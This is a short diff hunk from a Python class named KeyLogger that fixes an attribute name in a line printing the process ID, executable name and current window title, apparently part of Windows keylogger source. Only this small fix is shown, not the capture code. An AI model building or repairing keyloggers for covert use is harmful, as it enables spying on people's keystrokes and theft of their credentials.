@@ -39,7 +39,7 @@ class KeyLogger:
         except UnicodeDecodeError as e:
             print(f'{e}: window name unknown')
         
-        print('\n', processID, executable.value.decode(), self.current_window)
+        print('\n', processID, executable.value.decode(), self.currentWindow)
         
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(hProcess)
